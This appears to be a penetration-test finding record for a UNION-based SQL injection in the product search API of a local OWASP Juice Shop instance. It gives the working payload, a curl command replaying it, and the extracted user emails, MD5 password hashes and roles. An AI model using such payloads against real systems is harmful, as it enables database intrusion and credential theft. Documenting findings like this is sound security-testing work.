title: SQL Injection in Product Search API
description: The REST API endpoint /rest/products/search?q= is vulnerable to UNION-based SQL injection (SQLite 3.44.2). The 'q' parameter is directly concatenated into SQL queries without parameterization. Using a UNION SELECT payload, all 25 user records including emails, password hashes (MD5), and roles were extracted from the Users table.
poc:
Request: GET /rest/products/search?q=test'))UNION+SELECT+id,email,password,role,deletedAt,6,7,8,9+FROM+Users-- 
Observation: HTTP 200 response with JSON returning 25 records. Example: ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin
proof: Status: success, Total records: 25, ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin, ID:4 Email:bjoern.kimminich@gmail.com PwdHash:6edd9d726cbdc873c539e41ae8757b8c Role:admin, SQLite version: 3.44.2
how_captured: shell: # Re-run SQL injection to capture exact proof output for booking curl -s "http://127.0.0.1:3011/rest/products/search?q=test'))UNION+SELECT+id,email,password,rol

proof_excerpts.excerpt: Status: success, Total records: 25, ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin, ID:4 Email:bjoern.kimminich@gmail.com PwdHash:6edd9d726cbdc873c539e41ae8757b8c Role:admin, SQLite version: 3.44.2
proof_excerpts.how_captured: shell: # Re-run SQL injection to capture exact proof output for booking curl -s "http://127.0.0.1:3011/rest/products/search?q=test'))UNION+SELECT+id,email,password,rol
